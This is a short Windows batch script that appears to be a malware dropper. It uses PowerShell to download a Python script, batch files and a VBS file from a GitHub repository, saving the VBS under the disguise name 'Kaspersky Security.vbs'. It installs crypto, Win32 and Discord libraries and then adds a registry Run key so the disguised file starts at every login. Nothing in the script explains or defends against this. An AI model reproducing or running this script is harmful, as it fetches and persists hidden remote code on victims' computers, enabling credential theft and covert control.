powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/whynot1337/bobinka/raw/main/1.py', 'w8q6sgf0gsa.py')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/whynot1337/bobinka/raw/main/boba.vbs', 'Kaspersky Security.vbs')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/whynot1337/bobinka/raw/main/runpy.bat', 'runpy.bat')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/whynot1337/bobinka/raw/main/stop.bat', 'stop.bat')"
py -m pip install requests
py -m pip install pycryptodomex
py -m pip install discord.py
py -m pip install pypiwin32
@reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v sse /t REG_SZ /d "\"C:\Users\%USERNAME%\AppData\Roaming\torrent\Kaspersky Security.vbs"\" /f